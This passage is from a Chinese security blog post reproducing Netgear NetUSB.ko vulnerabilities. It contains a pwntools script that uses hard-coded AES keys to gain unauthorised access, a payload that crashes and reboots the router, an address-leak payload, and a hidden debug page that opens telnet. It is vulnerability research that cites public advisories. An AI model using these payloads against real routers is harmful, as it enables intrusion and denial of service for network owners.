class="keyword">lambda</span> p,x:p.recvn(x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(key,plaintext)</span>:</span></span><br><span class="line">	cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">	<span class="keyword">return</span> cipher.encrypt(plaintext)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(key,ciphertext)</span>:</span></span><br><span class="line">	cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">	<span class="keyword">return</span> cipher.decrypt(ciphertext)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">	context.log_level = <span class="string">'debug'</span></span><br><span class="line">	key1 = <span class="string">'A2353556541CFE44EC468248064DE66C'</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line">	key2 = decrypt(key1,<span class="string">'0B7928FF6A76223C21A3B794084E1CAD'</span>.decode(<span class="string">'hex'</span>))</span><br><span class="line"></span><br><span class="line">	p = remote(<span class="string">'192.168.1.1'</span>,<span class="number">20005</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># step 1</span></span><br><span class="line">	s(p,<span class="string">'\x56\x05'</span>)</span><br><span class="line">	s(p,<span class="string">'\x11'</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># step 2</span></span><br><span class="line">	randomData = rn(p,<span class="number">0x20</span>)[<span class="number">0x10</span>:]</span><br><span class="line">	cryptData = encrypt(key2,randomData)</span><br><span class="line">	log.info(<span class="string">'cryptData: '</span>+(binascii.b2a_hex(cryptData)))</span><br><span class="line">	s(p,cryptData)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># step 3</span></span><br><span class="line">	busidlen = <span class="number">0x10</span></span><br><span class="line">	busid = <span class="string">'a'</span>*busidlen</span><br><span class="line">	s(p,p32(busidlen)+busid)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># step 4</span></span><br><span class="line">	commad = p32(<span class="number">0x07</span>)</span><br><span class="line">	s(p,commad)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	pwn()</span><br></pre></td></tr></table></figure>
<h3 id="实现DoS"><a href="#实现DoS" class="headerlink" title="实现DoS"></a>实现DoS</h3><p>在上面的<code>step 4</code>之后直接发送触发漏洞的payload，可以看到路由器直接重启</p>
<pre><code>payload=&apos;\x02\x81\x00\x00&apos;
</code></pre><p><img src="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20190807144656.png" alt=""></p>
<h3 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h3><p>发送信息泄露的payload，发现确实泄露出来了几个地址</p>
<pre><code>payload=&apos;\x0c\x00&apos;+&apos;a&apos;*0x10
</code></pre><p><img src="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20190807145510.png" alt=""></p>
<p>进入路由器的shell，查看内核模块对应的加载地址，可以看到泄露出来的第三个地址正好属于NetUSB的加载范围之内，由此确实可以计算出来<code>NetUSB</code>模块的加载基址</p>
<p><img src="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20190807150751.png" alt=""></p>
<p>这里提一下获取shell的方式，在V1.0.9.12_1.2.23版本固件下访问<a href="http://192.168.1.1/DebugHiddenPage.htm" target="_blank" rel="noopener">http://192.168.1.1/DebugHiddenPage.htm</a> 然后在里面点击打开telnet的开关便可打开telnet，算是官方为了调试方便埋的一个后门吧，不过在后面的版本中就找不到这个页面了</p>
<p><img src="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20190807151523.png" alt=""></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本文对出现在路由器的内核模块<code>NetUSB.ko</code>中的两个漏洞进行了分析，包括由于硬编码导致的非授权访问漏洞以及由此引发的DoS和信息泄露，由于没法对该模块进行调试，导致没有对任意内存读取这个漏洞进行深入的分析。对于这两个漏洞，影响最大最直观的莫过于DoS了，直接连上局域网便可让路由器重启，而且很可能许多型号的路由器都存在该漏洞，因为他们的NetUSB.ko模块很可能没有变过（在测试过的R8000、R7000等路由器中NetUSB.ko的代码几乎一模一样）。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://sec-consult.com/en/blog/2015/05/kcodes-netusb-how-small-taiwanese/" target="_blank" rel="noopener">https://sec-consult.com/en/blog/2015/05/kcodes-netusb-how-small-taiwanese/</a></p>
<p><a href="https://talosintelligence.com/vulnerability_reports/TALOS-2019-0775" target="_blank" rel="noopener">https://talosintelligence.com/vulnerability_reports/TALOS-2019-0775</a></p>
<p><a href="https://talosintelligence.com/vulnerability_reports/TALOS-2019-0776" target="_blank" rel="noopener">https://talosintelligence.com/vulnerability_reports/TALOS-2019-0776</a></p>
<p><a href="https://kb.netgear.com/000061074/R6400-Firmware-Version-1-0-1-50" target="_blank" rel="noopener">https://kb.netgear.com/000061074/R6400-Firmware-Version-1-0-1-50</a></p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/路由器/" rel="tag"># 路由器</a>
          
            <a href="/tags/Netgear/" rel="tag"># Netgear</a>
          
            <a href="/tags/信息泄露/" rel="tag"># 信息泄露</a>
          
            <a href="/tags/DoS/" rel="tag"># DoS</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/07/31/browser/浏览器入门之starctf-OOB/" rel="next" title="浏览器入门之starctf-OOB">
                <i class="fa fa-chevron-left"></i> 浏览器入门之starctf-OOB
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/08/23/mips-pwn/mips-pwn环境搭建/" rel="prev" title="mips-pwn环境搭建">
                mips-pwn环境搭建 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">e3pem</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">22</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">3</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">22</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/e3pem" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i></a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:ymyushouxi@163.com" target="_blank" title="E-Mail">
                      
                        <i class="fa fa-fw fa-envelope"></i></a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                友情链接
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="http://p4nda.top/" title="P4nda" target="_blank">P4nda</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://sunichi.github.io/" title="Sunichi" target="_blank">Sunichi</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://ble55ing.github.io/" title="Ble55ing" target="_blank">Ble55ing</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://p1umer.github.io/" title="P1umer" target="_blank">P1umer</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://ama2in9.top/" title="Ama2in9" target="_blank">Ama2in9</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://xiaoxiaorenwu.top/" title="xiaoxiaorenwu" target="_blank">xiaoxiaorenwu</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞定位"><span class="nav-number">1.</span> <span class="nav-text">漏洞定位</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#未授权访问漏洞"><span class="nav-number">2.</span> <span class="nav-text">未授权访问漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#信息泄露漏洞"><span class="nav-number">3.</span> <span class="nav-text">信息泄露漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE-2019-5016"><span class="nav-number">3.1.</span> <span class="nav-text">CVE-2019-5016</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE-2019-5017"><span class="nav-number">3.2.</span> <span class="nav-text">CVE-2019-5017</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞复现"><span class="nav-number">4.</span> <span class="nav-text">漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#未授权访问"><span class="nav-number">4.1.</span> <span class="nav-text">未授权访问</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#实现DoS"><span class="nav-number">4.2.</span> <span class="nav-text">实现DoS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#信息泄露"><span class="nav-number">4.3.</span> <span class="nav-text">信息泄露</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考链接"><span class="nav-number">6.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">e3pem</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.3</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.3"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.3"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>



  


  




	





  





  












  





  

  

  
<script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>


  
  

  

  

  

</body>
</html>
